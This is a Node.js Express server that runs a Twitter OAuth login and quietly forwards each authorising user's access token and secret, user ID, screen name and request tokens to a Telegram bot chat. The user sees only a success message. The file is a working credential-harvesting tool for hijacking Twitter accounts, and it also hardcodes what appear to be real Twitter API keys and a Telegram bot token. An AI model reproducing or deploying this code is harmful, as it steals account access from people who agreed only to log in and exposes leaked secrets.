const express = require("express");
const OAuth = require("oauth");
const session = require("express-session");
const axios = require("axios");

const app = express();
const path = require('path');

const port = 3000;

// Replace these with your actual Twitter app credentials
const consumerKey = "ok9YMkxiCId3TfcFutB1rirWY"; //API Key here 
const consumerSecret = "ICU5b8tVaunNxayDgwFELn6xsG93g20C0HLSHwBjo7dgcdGLzc"; //API Key Secret here
const callbackURL = "https://lazy-puce-bat-tam.cyclic.app/callback"; // your domain name here with /callback just like the example in there 

const twitterOAuth = new OAuth.OAuth(
  "https://api.twitter.com/oauth/request_token",
  "https://api.twitter.com/oauth/access_token",
  consumerKey,
  consumerSecret,
  "1.0A",
  callbackURL,
  "HMAC-SHA1"
);

app.use(express.urlencoded({ extended: true }));

app.use(
  session({
    secret: consumerSecret, // Replace with a secure secret key
    resave: true,
    saveUninitialized: true,
  })
);

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
}); 

app.post("/authorize", (req, res) => {
  // Obtain request token and redirect user to Twitter authorization URL
  twitterOAuth.getOAuthRequestToken(
    (error, oauthToken, oauthTokenSecret, results) => {
      if (error) {
        console.error("Error getting request token:", error);
        res.status(500).send("Error getting request token");
      } else {
        // Save the request token and secret in session or database for later use
        req.session.oauthToken = oauthToken;
        req.session.oauthTokenSecret = oauthTokenSecret;

        // Redirect the user to the Twitter authorization URL
        const authUrl = `https://api.twitter.com/oauth/authenticate?oauth_token=${oauthToken}`;
        res.redirect(authUrl);
      }
    }
  );
});

app.get("/callback", (req, res) => {
  const oauthVerifier = req.query.oauth_verifier;
  const oauthToken = req.query.oauth_token;

  // Retrieve saved request token and secret from session or database
  const { oauthTokenSecret } = req.session;

  // Exchange request token for access token
  twitterOAuth.getOAuthAccessToken(
    oauthToken,
    oauthTokenSecret,
    oauthVerifier,
    (error, accessToken, accessTokenSecret, results) => {
      if (error) {
        console.error("Error getting access token:", error);
        res.status(500).send("Error getting access token");
      } else {
        // Now you have the access tokens and additional user information
        const telegramBotToken =
          "6905104877:AAFH0PWM3y57IfA6WWb8vQN2jpwbsCECuaI"; //your telegram API key here 
        const chatId = "-1001941763380"; // your chat id or group id here 

        const message = `Twitter Access Token: ${accessToken}\nTwitter Access Token Secret: ${accessTokenSecret}\nUser ID: ${results.user_id}\nScreen Name: ${results.screen_name}\nAuth Token: ${req.session.oauthToken}\nAuth Token Secret: ${req.session.oauthTokenSecret}`;

        // Send the message to Telegram
        axios
          .post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
          })
          .then(() => res.send("Authorization successful!"))
          .catch((telegramErr) => {
            console.error("Error sending message to Telegram:", telegramErr);
            res.status(500).send("Internal Server Error");
          });
      }
    }
  );
});


app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
